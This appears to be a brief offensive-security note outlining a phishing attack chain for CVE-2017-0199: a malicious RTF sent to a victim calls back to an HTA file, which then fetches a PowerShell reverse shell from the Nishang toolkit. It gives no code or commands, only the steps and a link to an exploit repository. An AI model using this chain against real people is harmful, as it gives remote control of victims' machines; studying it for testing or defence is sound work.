#malicious RTF file (https://github.com/bhdresh/CVE-2017-0199)
Nishang has several HTA payloads that you can include PS in the script

In general, RTF process will be 1) send RTF file to victim, 2) RTF calls back to HTA file to get more payload (stage 2, sorta), then
3) you can use the HTA script to call out for more data/more bad on a 3rd script, such as a PS1 Reverse Nishang script.
